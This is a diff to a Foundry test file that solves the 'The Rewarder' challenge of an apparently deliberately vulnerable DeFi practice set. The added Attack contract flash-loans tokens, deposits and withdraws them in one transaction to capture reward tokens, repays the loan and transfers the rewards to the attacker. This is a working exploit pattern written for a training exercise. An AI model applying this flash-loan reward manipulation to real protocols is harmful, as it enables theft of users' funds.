@@ -10,6 +10,35 @@ import {RewardToken} from "../../../src/Contracts/the-rewarder/RewardToken.sol";
 import {AccountingToken} from "../../../src/Contracts/the-rewarder/AccountingToken.sol";
 import {FlashLoanerPool} from "../../../src/Contracts/the-rewarder/FlashLoanerPool.sol";
 
+
+contract Attack {
+    FlashLoanerPool flashLoanerPool;
+    TheRewarderPool theRewarder;
+    DamnValuableToken token;
+    RewardToken rewardToken;
+
+    address payable owner;
+    constructor(address _pool, address _theRewarder, address dvt, address _rewardToken) {
+        flashLoanerPool = FlashLoanerPool(_pool);
+        theRewarder = TheRewarderPool(_theRewarder);
+        token = DamnValuableToken(dvt);
+        rewardToken = RewardToken(_rewardToken);
+        owner = payable(msg.sender);
+    }
+    function attack() external payable {
+        flashLoanerPool.flashLoan(1_000_000 ether);
+    }
+    function receiveFlashLoan(uint256 _amount) external payable {
+        token.approve(address(theRewarder), 1_000_000 ether);
+        theRewarder.deposit(1_000_000 ether);
+        theRewarder.withdraw(1_000_000 ether);
+        token.transfer(address(flashLoanerPool), 1_000_000 ether);
+        rewardToken.approve(owner, type(uint256).max);
+        rewardToken.transfer(owner, rewardToken.balanceOf(address(this)));
+    }
+    receive() external payable {}
+}
+
 contract TheRewarder is Test {
     uint256 internal constant TOKENS_IN_LENDER_POOL = 1_000_000e18;
     uint256 internal constant USER_DEPOSIT = 100e18;
@@ -88,7 +117,11 @@ contract TheRewarder is Test {
         /**
          * EXPLOIT START *
          */
-
+        vm.startPrank(attacker);
+        vm.warp(block.timestamp + 5 days); // 5 days
+        Attack attack = new Attack(address(flashLoanerPool), address(theRewarderPool), address(dvt), address(theRewarderPool.rewardToken()));
+        attack.attack();
+        vm.stopPrank();
         /**
          * EXPLOIT END *
          */
